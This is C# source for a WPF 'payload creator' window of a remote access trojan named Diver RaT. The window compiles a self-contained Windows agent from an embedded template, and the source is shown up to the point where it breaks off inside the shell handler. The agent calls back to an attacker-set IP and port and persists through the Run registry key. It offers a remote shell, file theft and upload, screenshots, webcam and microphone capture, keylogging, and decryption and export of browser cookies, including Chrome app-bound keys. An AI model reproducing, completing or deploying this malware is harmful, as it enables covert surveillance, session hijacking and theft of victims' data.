using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
        using System.Net;
        using System.Net.Http;
        using System.Net.Sockets;
using System.Threading.Tasks;
using System.Windows;
using Microsoft.Win32;

namespace Diver_RaT
{
    public partial class PayloadCreatorWindow : Window
    {
        private string _lastBuildError = string.Empty;

        public PayloadCreatorWindow()
        {
            InitializeComponent();
            IpTextBox.Text = string.IsNullOrWhiteSpace(ControllerSettings.Ip) ? GetLocalIpv4() : ControllerSettings.Ip;
            PortTextBox.Text = ControllerSettings.Port.ToString(System.Globalization.CultureInfo.InvariantCulture);
            OutputTextBox.Text = Path.Combine(
                Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory), "DiverPayloads");
        }

        private void BrowseButton_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new OpenFolderDialog { Title = "Select output folder" };
            if (dlg.ShowDialog(this) == true) OutputTextBox.Text = dlg.FolderName;
        }

        private void BrowseIconButton_Click(object sender, RoutedEventArgs e)
        {
            var dlg = new OpenFileDialog
            {
                Title = "Select an icon image",
                Filter = "Images|*.png;*.jpg;*.jpeg;*.ico;*.bmp"
            };
            if (dlg.ShowDialog(this) != true) return;
            IconTextBox.Text = dlg.FileName;
            try { IconPreview.Source = PayloadIcon.ToBitmapSource(dlg.FileName); } catch { IconPreview.Source = null; }
        }

        private void ClearIconButton_Click(object sender, RoutedEventArgs e)
        {
            IconTextBox.Text = "";
            IconPreview.Source = null;
        }

        private void CloseButton_Click(object sender, RoutedEventArgs e) => Close();

        private async void GenerateButton_Click(object sender, RoutedEventArgs e)
        {
            if (!Validate(out int port, out int heartbeat)) return;

SetBusy(true);
            ProgressText.Text = "Generating payload... (first build can take a minute)";
            BuildProgress.Visibility = Visibility.Visible;

            try
            {
                var assemblyName = SanitizeName(NameTextBox.Text);
                var outDir = OutputTextBox.Text.Trim();
                Directory.CreateDirectory(outDir);

                var buildDir = Path.Combine(Path.GetTempPath(), "DiverPayload_" + Guid.NewGuid().ToString("N"));
                Directory.CreateDirectory(buildDir);
                var csprojPath = Path.Combine(buildDir, "Agent.csproj");
                var programPath = Path.Combine(buildDir, "Program.cs");

                var csprojContent = CsprojTemplate.Replace("%%ASSEMBLY%%", assemblyName);
                var iconLine = "";
                if (!string.IsNullOrEmpty(IconTextBox.Text) && PayloadIcon.IsImageFile(IconTextBox.Text))
                {
                    PayloadIcon.WriteIcoFile(IconTextBox.Text, Path.Combine(buildDir, "app.ico"));
                    iconLine = "<ApplicationIcon>app.ico</ApplicationIcon>";
                }
                csprojContent = csprojContent.Replace("%%APPICON%%", iconLine);
                await File.WriteAllTextAsync(csprojPath, csprojContent);

                var persistCall = RunAtStartupCheck.IsChecked == true ? "Persist();" : "";
                await File.WriteAllTextAsync(programPath, ProgramTemplate
                    .Replace("%%IP%%", IpTextBox.Text.Trim())
                    .Replace("%%PORT%%", port.ToString())
                    .Replace("%%HEARTBEAT%%", heartbeat.ToString())
                    .Replace("%%PERSIST%%", persistCall));

                bool ok = await Task.Run(() => RunPublish(csprojPath, outDir));

                if (ok)
                {
                    var exe = Path.Combine(outDir, assemblyName + ".exe");
                    ProgressText.Text = $"Done - created {exe}";
                    InfoText.Text = $"Run {exe} on a target machine; it connects to " +
                                    $"{IpTextBox.Text.Trim()}:{port}, registers, then appears in the device table. " +
                                    "Right-click it there to send commands.";
                }
                else
                {
                    ProgressText.Text = "Build failed. " + _lastBuildError;
                }
            }
            catch (Exception ex)
            {
                ProgressText.Text = "Error: " + ex.Message;
            }
            finally
            {
                SetBusy(false);
            }
        }

        private bool RunPublish(string csprojPath, string outDir)
        {
            var psi = new ProcessStartInfo("dotnet")
            {
                UseShellExecute = false,
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                CreateNoWindow = true
            };
            psi.ArgumentList.Add("publish");
            psi.ArgumentList.Add(csprojPath);
            psi.ArgumentList.Add("-c");
            psi.ArgumentList.Add("Release");
            psi.ArgumentList.Add("-r");
            psi.ArgumentList.Add("win-x64");
            psi.ArgumentList.Add("--self-contained");
            psi.ArgumentList.Add("true");
            psi.ArgumentList.Add("-o");
            psi.ArgumentList.Add(outDir);

            using var p = Process.Start(psi);
            if (p == null) { _lastBuildError = "Could not start dotnet."; return false; }

            var stdout = p.StandardOutput.ReadToEnd();
            var stderr = p.StandardError.ReadToEnd();
            p.WaitForExit();

            if (p.ExitCode != 0)
            {
                var tail = (stdout + "\n" + stderr)
                    .Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)
                    .TakeLast(6);
                _lastBuildError = string.Join("  |  ", tail);
                return false;
            }
            return true;
        }

        private bool Validate(out int port, out int heartbeat)
        {
            port = 0;
            heartbeat = 0;

            if (string.IsNullOrWhiteSpace(IpTextBox.Text))
            {
                ProgressText.Text = "Enter the controller IP address.";
                return false;
            }
            if (!int.TryParse(PortTextBox.Text.Trim(), out port) || port is < 1 or > 65535)
            {
                ProgressText.Text = "Enter a valid TCP port (1-65535).";
                return false;
            }
            if (!int.TryParse(HeartbeatTextBox.Text.Trim(), out heartbeat) || heartbeat < 1)
            {
                ProgressText.Text = "Enter a valid heartbeat interval in seconds.";
                return false;
            }
            return true;
        }

private void SetBusy(bool busy)
        {
            GenerateButton.IsEnabled = !busy;
            BrowseButton.IsEnabled = !busy;
            CancelButton.Content = busy ? "Working..." : "Close";
            BuildProgress.Visibility = busy ? Visibility.Visible : Visibility.Collapsed;
        }

        private static string SanitizeName(string name)
        {
            var invalid = Path.GetInvalidFileNameChars();
            var clean = new string(name.Where(c => !invalid.Contains(c)).ToArray()).Trim();
            clean = clean.Replace("&", "").Replace("<", "").Replace(">", "").Replace("\"", "").Replace("'", "");
            return string.IsNullOrWhiteSpace(clean) ? "client" : clean;
        }

        private static string GetLocalIpv4()
        {
            try
            {
                var host = Dns.GetHostEntry(Dns.GetHostName());
                var ip = host.AddressList.FirstOrDefault(a =>
                    a.AddressFamily == AddressFamily.InterNetwork && !IPAddress.IsLoopback(a));
                return ip?.ToString() ?? "127.0.0.1";
            }
            catch
            {
                return "127.0.0.1";
            }
        }

        private const string CsprojTemplate = """
        <Project Sdk="Microsoft.NET.Sdk">

          <PropertyGroup>
            <OutputType>WinExe</OutputType>
            <TargetFramework>net8.0-windows</TargetFramework>
            <UseWindowsForms>true</UseWindowsForms>
            %%APPICON%%
            <ImplicitUsings>enable</ImplicitUsings>
            <Nullable>enable</Nullable>
            <AssemblyName>%%ASSEMBLY%%</AssemblyName>
            <RootNamespace>Agent</RootNamespace>
            <PublishSingleFile>true</PublishSingleFile>
            <EnableCompressionInSingleFile>true</EnableCompressionInSingleFile>
            <SelfContained>true</SelfContained>
            <RuntimeIdentifier>win-x64</RuntimeIdentifier>
            <IncludeNativeLibrariesForSelfExtract>true</IncludeNativeLibrariesForSelfExtract>
            <InvariantGlobalization>true</InvariantGlobalization>
            <SatelliteResourceLanguages>en</SatelliteResourceLanguages>
            <DebugType>none</DebugType>
            <NoWarn>NU1701</NoWarn>
          </PropertyGroup>

          <ItemGroup>
            <PackageReference Include="AForge.Video.DirectShow" Version="2.2.5" />
            <PackageReference Include="Microsoft.Data.Sqlite" Version="8.0.8" />
            <PackageReference Include="NAudio" Version="2.2.1" />
            <PackageReference Include="System.Security.Cryptography.ProtectedData" Version="8.0.0" />
          </ItemGroup>

        </Project>
        """;

        private const string ProgramTemplate = """
        using System;
        using System.Collections.Generic;
        using System.Collections.Concurrent;
        using System.Diagnostics;
        using System.Drawing;
        using System.Drawing.Imaging;
        using System.IO;
        using System.Linq;
        using System.Net;
        using System.Net.Sockets;
        using System.Runtime.InteropServices;
        using System.Security.Cryptography;
        using System.Text;
        using System.Text.Json;
        using System.Threading;
        using System.Threading.Tasks;
        using System.Windows.Forms;
        using AForge.Video.DirectShow;
        using Microsoft.Data.Sqlite;
        using NAudio.Wave;

        namespace Agent;

        internal static class Program
        {
            private const string Host = "%%IP%%";
            private const int Port = %%PORT%%;
            private static readonly TimeSpan Heartbeat = TimeSpan.FromSeconds(%%HEARTBEAT%%);
            private static readonly JsonSerializerOptions JsonOpts = new() { PropertyNameCaseInsensitive = true };

            [STAThread]
            private static async Task Main()
            {
                while (true)
                {
                    try
                    {
                        %%PERSIST%%
                        using var client = new TcpClient();
                        try { client.ReceiveBufferSize = 4 * 1024 * 1024; client.SendBufferSize = 4 * 1024 * 1024; } catch { }
                        await client.ConnectAsync(Host, Port);
                        using var stream = client.GetStream();
                        using var reader = new StreamReader(stream, Encoding.UTF8);
                        using var writer = new StreamWriter(stream, new UTF8Encoding(false)) { NewLine = "\n", AutoFlush = true };

                        await Send(writer, new
                        {
                            type = "REGISTER",
                            data = new
                            {
                                id = GetAgentId(),
                                hostname = Environment.MachineName,
                                os = Environment.OSVersion.VersionString,
                                username = Environment.UserName,
                                country = "??",
                                deviceType = DetectDeviceType(),
                                ip = GetLocalIp()
                            }
                        });

                        _ = ReadLoop(reader, writer);

                        while (true)
                        {
                            await Task.Delay(Heartbeat);
                            await Send(writer, new { type = "HEARTBEAT" });
                        }
                    }
                    catch
                    {
                    }
                    await Task.Delay(TimeSpan.FromSeconds(5));
                }
            }

            private static void Persist()
            {
                try
                {
                    using var key = Microsoft.Win32.Registry.CurrentUser
                        .OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true);
                    key?.SetValue("DiverRaT", Environment.ProcessPath);
                }
                catch { }
            }

            private static async Task ReadLoop(StreamReader reader, StreamWriter writer)
            {
                try
                {
                    while (true)
                    {
                        var line = await reader.ReadLineAsync();
                        if (line is null) return;
                        var msg = JsonSerializer.Deserialize<Message>(line, JsonOpts);
                        if (msg is null || msg.Type != "COMMAND") continue;

                        var (ok, data) = Handle(msg.Command, msg.Args);
                        await Send(writer, new
                        {
                            type = "RESULT",
                            requestId = msg.RequestId,
                            command = msg.Command,
                            success = ok,
                            data
                        });
                    }
                }
                catch
                {
                }
            }

            private static (bool, string) Handle(string? command, Dictionary<string, string>? args)
            {
                try
                {
                    switch (command)
                    {
                        case "GET_INFO":
                            return (true, $"host={Environment.MachineName};os={Environment.OSVersion.VersionString};user={Environment.UserName}");

                        case "SHELL":
                            return RunShell(args != null && args.TryGetValue("cmd", out var c) ? c : "");

                        case "LIST_DIR":
                            return ListDirectory(args != null && args.TryGetValue("path", out var p) ? p : @"C:\");

                        case "LIST_DRIVES":
                            return ListDrives();

                        case "DOWNLOAD":
                            return (true, Convert.ToBase64String(File.ReadAllBytes(args != null && args.TryGetValue("path", out var dp) ? dp : "")));

                        case "UPLOAD":
                            var up = args != null && args.TryGetValue("path", out var pp) ? pp : "";
                            var data = args != null && args.TryGetValue("data", out var dd) ? dd : "";
                            File.WriteAllBytes(up, Convert.FromBase64String(data));
                            return (true, $"written to {up}");

                        case "LIST_SCREENS":
                            return ListScreens();

                        case "SCREENSHOT":
                            return CaptureScreen(args);

                        case "LIST_CAMS":
                            return ListCameras();

                        case "WEBCAM":
                            var camIndex = args != null && args.TryGetValue("index", out var ix) && int.TryParse(ix, out var parsedIx) ? parsedIx : 0;
                            return CaptureCamera(camIndex);

                        case "LIST_MICS":
                            return ListMicrophones();

                        case "START_AUDIO":
                            var micIndex = args != null && args.TryGetValue("index", out var mi) && int.TryParse(mi, out var pm) ? pm : -1;
                            MicRecorder.Start(micIndex);
                            return (true, "audio recording started");

                        case "GET_AUDIO":
                            return MicRecorder.Drain() is { } chunk ? (true, chunk) : (false, "");

                        case "STOP_AUDIO":
                            MicRecorder.Stop();
                            return (true, "audio recording stopped");

                        case "LIST_PROCESSES":
                            return ListProcesses();

                        case "TERMINATE_PROCESS":
                            var tPid = args != null && args.TryGetValue("pid", out var pv) && int.TryParse(pv, out var ppid) ? ppid : -1;
                            return KillProcess(tPid);

                        case "LIST_APPS":
                            return ListInstalledApps();

                        case "UNINSTALL_APP":
                            var ustr = args != null && args.TryGetValue("package", out var uu) ? uu : "";
                            if (string.IsNullOrWhiteSpace(ustr)) return (false, "no uninstall command available for this app");
                            Process.Start(new ProcessStartInfo(ustr) { UseShellExecute = true });
                            return (true, "uninstaller launched");

                        case "GET_LOCATION":
                            return GetLocation();

                        case "START_KEYLOG":
                            KeyLogger.Start();
                            return (true, "keylogger started");

                        case "STOP_KEYLOG":
                            KeyLogger.Stop();
                            return (true, "keylogger stopped");

                        case "GET_KEYLOG":
                            return (true, KeyLogger.GetLog());

                        case "CLEAR_KEYLOG":
                            KeyLogger.Clear();
                            return (true, "keylog cleared");

                        case "MESSAGE_BOX":
                            var text = args != null && args.TryGetValue("text", out var t) ? t : "Hello";
                            var boxTitle = args != null && args.TryGetValue("title", out var bt) ? bt : "Diver RaT";
                            Task.Run(() => MessageBox.Show(text, boxTitle, MessageBoxButtons.OK, MessageBoxIcon.Information));
                            return (true, "message shown");

                        case "LIST_BROWSERS":
                            return ListBrowsers();

                        case "DUMP_COOKIES":
                            var browserId = args != null && args.TryGetValue("browser", out var bid) ? bid : "";
                            return DumpCookies(browserId);

                        case "OPEN_URL":
                            var url = args != null && args.TryGetValue("url", out var u) ? u : "https://example.com";
                            Process.Start(new ProcessStartInfo(url) { UseShellExecute = true });
                            return (true, "url opened");

                        case "LOCK_SCREEN":
                            Process.Start(new ProcessStartInfo("rundll32.exe", "user32.dll,LockWorkStation") { UseShellExecute = true });
                            return (true, "screen locked");

                        case "SHUTDOWN":
                            Process.Start(new ProcessStartInfo("shutdown.exe", "/s /t 5") { UseShellExecute = true });
                            return (true, "shutdown in 5s");

                        case "RESTART":
                            Process.Start(new ProcessStartInfo("shutdown.exe", "/r /t 5") { UseShellExecute = true });
                            return (true, "restart in 5s");

                        case "DISCONNECT":
                            Environment.Exit(0);
                            return (true, "bye");

                        case "MOUSE_MOVE":
                            return RemoteInput.Move(args);

                        case "MOUSE_CLICK":
                            return RemoteInput.Click(args);

                        case "SCROLL":
                            return RemoteInput.Scroll(args);

                        case "KEY_DOWN":
                            return RemoteInput.KeyDown(args);

                        case "KEY_UP":
                            return RemoteInput.KeyUp(args);

                        case "GET_CURSOR":
                            return RemoteInput.GetCursor();

                        case "LOCK_INPUT":
                            return RemoteInput.LockInput(args);

                        case "GET_SCREEN_SIZE":
                            return RemoteInput.GetScreenSize();

                        default:
                            return (false, "command not implemented");
                    }
                }
                catch (Exception ex)
                {
                    return (false, ex.Message);
                }
            }

            private static (bool, string) ListBrowsers()
            {
                var list = new List<object>();
                var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                AddChromium(list, "chrome", "Google Chrome", Path.Combine(local, "Google", "Chrome", "User Data"));
                AddChromium(list, "edge", "Microsoft Edge", Path.Combine(local, "Microsoft", "Edge", "User Data"));
                AddChromium(list, "brave", "Brave", Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data"));
                AddChromium(list, "vivaldi", "Vivaldi", Path.Combine(local, "Vivaldi", "User Data"));
                AddChromium(list, "chromium", "Chromium", Path.Combine(local, "Chromium", "User Data"));
                AddOpera(list, Path.Combine(roaming, "Opera Software", "Opera Stable"));
                AddFirefox(list, Path.Combine(roaming, "Mozilla", "Firefox"));

                return (true, JsonSerializer.Serialize(list));
            }

            private static void AddChromium(List<object> list, string id, string name, string userData)
            {
                if (!Directory.Exists(userData)) return;
                var profiles = new List<object>();
                foreach (var dir in Directory.GetDirectories(userData))
                {
                    var pname = Path.GetFileName(dir);
                    if (pname != "Default" && !pname.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase)) continue;
                    if (FindChromiumCookieDb(dir) is null) continue;
                    profiles.Add(new { name = pname, hasCookies = true });
                }
                if (profiles.Count == 0) return;
                list.Add(new { id, name, path = userData, profiles });
            }

            private static void AddOpera(List<object> list, string profileDir)
            {
                if (!Directory.Exists(profileDir)) return;
                if (FindChromiumCookieDb(profileDir) is null) return;
                list.Add(new
                {
                    id = "opera",
                    name = "Opera",
                    path = Path.GetDirectoryName(profileDir) ?? profileDir,
                    profiles = new[] { new { name = "Opera Stable", hasCookies = true } }
                });
            }

            private static void AddFirefox(List<object> list, string firefoxDir)
            {
                if (!Directory.Exists(firefoxDir)) return;
                var profiles = new List<object>();
                foreach (var dir in Directory.GetDirectories(firefoxDir))
                {
                    if (!File.Exists(Path.Combine(dir, "cookies.sqlite"))) continue;
                    profiles.Add(new { name = Path.GetFileName(dir), hasCookies = true });
                }
                if (profiles.Count == 0) return;
                list.Add(new { id = "firefox", name = "Mozilla Firefox", path = firefoxDir, profiles });
            }

            private static (bool, string) DumpCookies(string browserId)
            {
                var config = GetBrowserConfig(browserId);
                if (config is null) return (false, $"browser not found: {browserId}");

                var outRoot = Path.Combine(AppContext.BaseDirectory, "BrowserBackup", config.Id);
                Directory.CreateDirectory(outRoot);
                var files = new List<object>();
                long total = 0;

                foreach (var profile in config.Profiles)
                {
                    List<CookieEntry> cookies;
                    try
                    {
                        cookies = ReadCookies(config, profile);
                    }
                    catch (Exception ex)
                    {
                        files.Add(new { site = profile + " (error)", path = "", size = 0, cookies = 0, error = ex.Message });
                        continue;
                    }

                    var grouped = cookies
                        .Where(c => !string.IsNullOrEmpty(c.Name) || !string.IsNullOrEmpty(c.Value))
                        .GroupBy(c => NormalizeSite(c.Host))
                        .OrderBy(g => g.Key, StringComparer.OrdinalIgnoreCase);

                    foreach (var group in grouped)
                    {
                        var sb = new StringBuilder();
                        sb.AppendLine("# Netscape HTTP Cookie File");
                        sb.AppendLine($"# Diver RaT export - {config.Name} - {group.Key}");
                        foreach (var c in group.OrderBy(c => c.Path, StringComparer.OrdinalIgnoreCase))
                            sb.AppendLine(c.ToNetscape());

                        var fileName = SafeFileName(group.Key) + ".txt";
                        var fullPath = Path.Combine(outRoot, fileName);
                        File.WriteAllText(fullPath, sb.ToString());
                        files.Add(new { site = group.Key, path = fullPath, size = new FileInfo(fullPath).Length, cookies = group.Count() });
                        total += group.Count();
                    }
                }

                return (true, JsonSerializer.Serialize(new
                {
                    browser = config.Id,
                    folder = outRoot,
                    total,
                    files
                }));
            }

            private static List<CookieEntry> ReadCookies(BrowserConfig cfg, string profile)
            {
                var list = new List<CookieEntry>();
                string dbPath;
                if (cfg.Chromium)
                {
                    var profileDir = cfg.Id == "opera" ? cfg.UserData : Path.Combine(cfg.UserData, profile);
                    dbPath = FindChromiumCookieDb(profileDir)!;
                }
                else
                {
                    dbPath = Path.Combine(cfg.UserData, profile, "cookies.sqlite");
                }

                var keys = cfg.Chromium ? GetCookieKeys(cfg.UserData) : null;
                var tmp = CopyToTemp(dbPath, cfg.Id);
                try
                {
                    using var con = new SqliteConnection($"Data Source={tmp};Mode=ReadOnly");
                    con.Open();
                    using var cmd = con.CreateCommand();
                    if (cfg.Chromium)
                    {
                        cmd.CommandText = "SELECT host_key, name, path, expires_utc, is_secure, is_httponly, value, encrypted_value FROM cookies";
                        using var r = cmd.ExecuteReader();
                        while (r.Read())
                        {
                            var host = r.GetString(0);
                            var name = r.GetString(1);
                            var path = r.GetString(2);
                            var expiresUtc = r.GetInt64(3);
                            var secure = r.GetInt64(4) != 0;
                            var httpOnly = r.GetInt64(5) != 0;
                            var plain = r.IsDBNull(6) ? "" : r.GetString(6);
                            var encrypted = r.IsDBNull(7) ? Array.Empty<byte>() : (byte[])r[7];
                            var value = !string.IsNullOrEmpty(plain) ? plain : (cfg.Chromium ? DecryptValue(keys!, encrypted) : "");
                            list.Add(new CookieEntry { Host = host, Name = name, Path = path, Expiry = ChromeEpochToUnix(expiresUtc), Secure = secure, HttpOnly = httpOnly, Value = value });
                        }
                    }
                    else
                    {
                        cmd.CommandText = "SELECT baseDomain, name, value, path, expiry, isSecure, isHttpOnly FROM moz_cookies";
                        using var r = cmd.ExecuteReader();
                        while (r.Read())
                        {
                            list.Add(new CookieEntry
                            {
                                Host = r.GetString(0),
                                Name = r.GetString(1),
                                Value = r.GetString(2),
                                Path = r.GetString(3),
                                Expiry = r.GetInt64(4),
                                Secure = r.GetInt64(5) != 0,
                                HttpOnly = r.GetInt64(6) != 0
                            });
                        }
                    }
                }
                finally
                {
                    try { File.Delete(tmp); } catch { }
                }
                return list;
            }

            private static string? FindChromiumCookieDb(string profileDir)
            {
                var modern = Path.Combine(profileDir, "Network", "Cookies");
                if (File.Exists(modern)) return modern;
                var legacy = Path.Combine(profileDir, "Cookies");
                return File.Exists(legacy) ? legacy : null;
            }

            private static BrowserConfig? GetBrowserConfig(string id)
            {
                var local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
                var roaming = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

                string[] chromiumIds = { "chrome", "edge", "brave", "vivaldi", "chromium" };
                string[] chromiumPaths =
                {
                    Path.Combine(local, "Google", "Chrome", "User Data"),
                    Path.Combine(local, "Microsoft", "Edge", "User Data"),
                    Path.Combine(local, "BraveSoftware", "Brave-Browser", "User Data"),
                    Path.Combine(local, "Vivaldi", "User Data"),
                    Path.Combine(local, "Chromium", "User Data")
                };

                for (int i = 0; i < chromiumIds.Length; i++)
                {
                    if (id == chromiumIds[i] && Directory.Exists(chromiumPaths[i]))
                    {
                        var cfg = new BrowserConfig { Id = id, Name = ChromeName(id), UserData = chromiumPaths[i], Chromium = true };
                        foreach (var dir in Directory.GetDirectories(cfg.UserData))
                        {
                            var pname = Path.GetFileName(dir);
                            if ((pname == "Default" || pname.StartsWith("Profile ", StringComparison.OrdinalIgnoreCase)) && FindChromiumCookieDb(dir) != null)
                                cfg.Profiles.Add(pname);
                        }
                        if (cfg.Profiles.Count > 0) return cfg;
                        return null;
                    }
                }

                if (id == "opera")
                {
                    var op = Path.Combine(roaming, "Opera Software", "Opera Stable");
                    if (Directory.Exists(op) && FindChromiumCookieDb(op) != null)
                    {
                        var cfg = new BrowserConfig { Id = "opera", Name = "Opera", UserData = op, Chromium = true };
                        cfg.Profiles.Add("Opera Stable");
                        return cfg;
                    }
                }

                if (id == "firefox")
                {
                    var ff = Path.Combine(roaming, "Mozilla", "Firefox");
                    if (Directory.Exists(ff))
                    {
                        var cfg = new BrowserConfig { Id = "firefox", Name = "Mozilla Firefox", UserData = ff, Chromium = false };
                        foreach (var dir in Directory.GetDirectories(ff))
                            if (File.Exists(Path.Combine(dir, "cookies.sqlite")))
                                cfg.Profiles.Add(Path.GetFileName(dir));
                        if (cfg.Profiles.Count > 0) return cfg;
                    }
                }
                return null;
            }

            private static string ChromeName(string id) => id switch
            {
                "chrome" => "Google Chrome",
                "edge" => "Microsoft Edge",
                "brave" => "Brave",
                "vivaldi" => "Vivaldi",
                _ => "Chromium"
            };

            private static byte[]? GetChromeKey(string userData)
            {
                try
                {
                    var localState = Path.Combine(userData, "Local State");
                    if (!File.Exists(localState)) return null;
                    using var doc = JsonDocument.Parse(File.ReadAllText(localState));
                    if (!doc.RootElement.TryGetProperty("os_crypt", out var os) ||
                        !os.TryGetProperty("encrypted_key", out var ek)) return null;
                    var b64 = ek.GetString();
                    if (string.IsNullOrEmpty(b64)) return null;
                    var raw = Convert.FromBase64String(b64);
                    if (raw.Length <= 5 || Encoding.ASCII.GetString(raw, 0, 5) != "DPAPI") return null;
                    return ProtectedData.Unprotect(raw.AsSpan(5).ToArray(), null, DataProtectionScope.CurrentUser);
                }
                catch
                {
                    return null;
                }
            }

            private static string DecryptValue(List<byte[]> keys, byte[] encrypted)
            {
                foreach (var k in keys)
                {
                    var v = DecryptCookie(k, encrypted);
                    if (!string.IsNullOrEmpty(v)) return v;
                }
                foreach (var k in keys)
                {
                    var v = DecryptCookieCbc(k, encrypted);
                    if (!string.IsNullOrEmpty(v)) return v;
                }
                return "";
            }

            private static string DecryptCookie(byte[] key, byte[] encrypted)
            {
                try
                {
                    if (key is null || encrypted is null || encrypted.Length < 31) return "";
                    if (encrypted[0] != (byte)'v') return "";
                    var nonce = encrypted.AsSpan(3, 12).ToArray();
                    var ct = encrypted.AsSpan(15, encrypted.Length - 15 - 16).ToArray();
                    var tag = encrypted.AsSpan(encrypted.Length - 16, 16).ToArray();
                    using var aes = new AesGcm(key, 16);
                    var plain = new byte[ct.Length];
                    aes.Decrypt(nonce, ct, tag, plain);
                    return Encoding.UTF8.GetString(plain, Math.Min(32, plain.Length), plain.Length - Math.Min(32, plain.Length));
                }
                catch
                {
                    return "";
                }
            }

            private static string DecryptCookieCbc(byte[] key, byte[] encrypted)
            {
                try
                {
                    if (key is null || key.Length < 16 || encrypted is null || encrypted.Length < 19) return "";
                    if (encrypted[0] != (byte)'v') return "";
                    var iv = encrypted.AsSpan(3, 16).ToArray();
                    var ct = encrypted.AsSpan(19).ToArray();
                    if (ct.Length == 0 || ct.Length % 16 != 0) return "";
                    using var aes = Aes.Create();
                    aes.Key = key.AsSpan(0, 16).ToArray();
                    aes.IV = iv;
                    aes.Mode = CipherMode.CBC;
                    aes.Padding = PaddingMode.PKCS7;
                    using var dec = aes.CreateDecryptor();
                    var plain = dec.TransformFinalBlock(ct, 0, ct.Length);
                    return Encoding.UTF8.GetString(plain);
                }
                catch
                {
                    return "";
                }
            }

            private static List<byte[]> GetCookieKeys(string userData)
            {
                var list = new List<byte[]>();
                var app = GetAppBoundKey(userData);
                if (app != null) list.Add(app);
                var dp = GetChromeKey(userData);
                if (dp != null) list.Add(dp);
                return list;
            }

            private static byte[]? GetAppBoundKey(string userData)
            {
                try
                {
                    var localState = Path.Combine(userData, "Local State");
                    if (!File.Exists(localState)) return null;
                    using var doc = JsonDocument.Parse(File.ReadAllText(localState));
                    if (!doc.RootElement.TryGetProperty("os_crypt", out var os) ||
                        !os.TryGetProperty("app_bound_encrypted_key", out var ab)) return null;
                    var raw = Convert.FromBase64String(ab.GetString()!);
                    if (raw.Length < 65 || Encoding.ASCII.GetString(raw, 0, 4) != "APPB") return null;
                    var inner = raw.AsSpan(4).ToArray();
                    var sys = ProtectedData.Unprotect(inner, null, DataProtectionScope.LocalMachine);
                    var usr = ProtectedData.Unprotect(sys, null, DataProtectionScope.CurrentUser);
                    if (usr.Length < 61) return null;
                    var tail = usr.AsSpan(usr.Length - 61);
                    var flag = tail[0];
                    var iv = tail.Slice(1, 12).ToArray();
                    var ct = tail.Slice(13, 32).ToArray();
                    var tag = tail.Slice(45, 16).ToArray();
                    if (flag == 1)
                    {
                        using var aes = new AesGcm(Convert.FromHexString("B31C6E241AC846728DA9C1FAC4936651CFFB944D143AB816276BCC6DA0284787"), 16);
                        var plain = new byte[32];
                        aes.Decrypt(iv, ct, tag, plain);
                        return plain;
                    }
                    if (flag == 2 || flag == 204)
                    {
                        using var chacha = new ChaCha20Poly1305(Convert.FromHexString("E98F37D7F4E1FA433D19304DC2258042090E2D1D7EEA7670D41F738D08729660"));
                        var plain = new byte[32];
                        chacha.Decrypt(iv, ct, tag, plain);
                        return plain;
                    }
                    return null;
                }
                catch
                {
                    return null;
                }
            }

            private static long ChromeEpochToUnix(long microseconds)
            {
                if (microseconds <= 0) return 0;
                try
                {
                    var dt = new DateTime(1601, 1, 1, 0, 0, 0, DateTimeKind.Utc).AddTicks(microseconds / 10);
                    var unix = new DateTimeOffset(dt).ToUnixTimeSeconds();
                    return unix < 0 ? 0 : unix;
                }
                catch
                {
                    return 0;
                }
            }

            private static string NormalizeSite(string host)
            {
                var h = host.Trim().TrimStart('.');
                return string.IsNullOrWhiteSpace(h) ? "unknown" : h.ToLowerInvariant();
            }

            private static string SafeFileName(string s)
            {
                var invalids = Path.GetInvalidFileNameChars();
                var sb = new StringBuilder();
                foreach (var c in s)
                    sb.Append(invalids.Contains(c) ? '_' : c);
                return sb.ToString().Trim('.');
            }

            private static string CopyToTemp(string path, string browserId)
            {
                var tmp = Path.Combine(Path.GetTempPath(), "dvr_" + Guid.NewGuid().ToString("N") + ".db");
                try
                {
                    using var src = new FileStream(path, FileMode.Open, FileAccess.Read, FileShare.ReadWrite | FileShare.Delete);
                    using var dst = new FileStream(tmp, FileMode.CreateNew, FileAccess.Write, FileShare.None);
                    src.CopyTo(dst);
                    return tmp;
                }
                catch (IOException)
                {
                    KillBrowser(browserId);
                    Thread.Sleep(1500);
                    File.Copy(path, tmp, true);
                    return tmp;
                }
            }

            private static void KillBrowser(string browserId)
            {
                var names = browserId switch
                {
                    "chrome" => new[] { "chrome" },
                    "edge" => new[] { "msedge" },
                    "brave" => new[] { "brave" },
                    "vivaldi" => new[] { "vivaldi" },
                    "chromium" => new[] { "chrome", "chromium" },
                    "opera" => new[] { "opera" },
                    "firefox" => new[] { "firefox" },
                    _ => Array.Empty<string>()
                };
                foreach (var p in Process.GetProcesses())
                    if (names.Contains(p.ProcessName, StringComparer.OrdinalIgnoreCase))
                        try { p.Kill(); } catch { }
            }

            private sealed class BrowserConfig
            {
                public string Id = "";
                public string Name = "";
                public string UserData = "";
                public bool Chromium;
                public List<string> Profiles = new();
            }

            private sealed class CookieEntry
            {
                public string Host = "";
                public string Name = "";
                public string Value = "";
                public string Path = "/";
                public long Expiry;
                public bool Secure;
                public bool HttpOnly;

                public string ToNetscape()
                {
                    var host = Host.TrimStart('.');
                    var includeSub = Host.StartsWith(".") ? "TRUE" : "FALSE";
                    var hp = HttpOnly ? "#HttpOnly_" : "";
                    return $"{hp}{host}\t{includeSub}\t{Path}\t{(Secure ? "TRUE" : "FALSE")}\t{Expiry}\t{Name}\t{Value}";
                }
            }

            private static readonly object ShellLock = new();
            private static Process? ShellProc;
            private static readonly ConcurrentQueue<string> ShellOut = new();
            private static readonly ConcurrentQueue<string> ShellErr = new();

            private static void DrainPipe(StreamReader reader, ConcurrentQueue<string> queue)
            {
                _ = Task.Run(() =>
                {
                    try
                    {
                        string? line;
                        while ((line = reader.ReadLine()) != null) queue.Enqueue(line);
                    }
                    catch { }
                });
            }

            private static (bool, string) RunShell(string cmd)
            {
